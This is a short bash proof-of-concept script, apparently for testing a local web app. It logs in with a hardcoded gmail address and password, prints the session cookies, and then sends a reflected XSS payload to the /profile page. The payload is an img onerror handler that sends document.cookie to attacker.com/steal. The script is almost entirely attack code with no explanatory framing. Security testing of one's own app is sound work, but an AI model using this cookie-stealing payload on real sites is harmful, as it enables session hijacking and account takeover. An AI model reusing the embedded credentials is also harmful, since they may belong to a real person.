#!/bin/bash

# Login first
echo "Logging in..."
LOGIN=$(curl -s -c cookies.txt -X POST http://localhost:8080/api/login \
    -H "Content-Type: application/json" \
    -d '{"email":"ajohnson@gmail.com","password":"parola3"}')

# Check cookies
echo "Cookies:"
cat cookies.txt

# Access profile cu XSS
PAYLOAD="<img src=x onerror=\"fetch('http://attacker.com/steal?c='+document.cookie)\">"
ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD'''))")

echo ""
echo "Accessing /profile with XSS payload..."
curl -s -b cookies.txt "http://localhost:8080/profile?name=$ENCODED"